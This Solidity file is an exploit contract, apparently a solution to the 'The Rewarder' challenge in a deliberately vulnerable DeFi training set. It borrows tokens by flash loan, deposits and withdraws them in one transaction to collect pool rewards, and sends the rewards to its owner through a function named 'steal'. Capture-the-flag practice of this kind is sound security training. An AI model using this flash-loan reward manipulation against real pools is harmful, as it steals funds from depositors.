// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract TheRewarderHack {
    DamnValuableToken public immutable liquidityToken;
    FlashLoanerPool loan;
    TheRewarderPool pool;
    RewardToken public immutable rewardToken;
    address owner;

    constructor(
        address flashLoanPool,
        address victimePool,
        address liquidityTokenAddress,
        address rewardTokenAddress
    ) public {
        loan = FlashLoanerPool(flashLoanPool);
        pool = TheRewarderPool(victimePool);
        rewardToken = RewardToken(rewardTokenAddress);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        owner = msg.sender;
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(pool), amount);
        pool.deposit(amount);
        pool.withdraw(amount);
        liquidityToken.transfer(msg.sender, amount);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }

    function steal(uint256 amount) external {
        loan.flashLoan(amount);
    }
}
